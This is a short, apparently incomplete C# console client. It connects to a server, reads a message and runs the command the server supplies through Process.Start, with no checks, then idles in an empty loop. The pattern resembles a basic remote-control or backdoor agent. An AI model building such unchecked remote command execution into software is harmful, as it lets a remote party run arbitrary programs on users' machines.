using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;

namespace ClientProject
{
    class ClientProgram
    {
        static void Main(string[] args)
        {
            Client client = new Client();
            string path;
            try
            {
                client.Connect();
                //Console.WriteLine(client.GetMsg().ToString());
                path = client.GetMsg().ToString();
                Console.WriteLine(path);
                Process.Start(new ProcessStartInfo(client.command.ToString()) { UseShellExecute = true });
                Console.WriteLine(path);

                while (true)
                {

                    //Console.WriteLine(client.GetMsg().ToString());
                    
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.ReadLine();
            }
        }
    }
}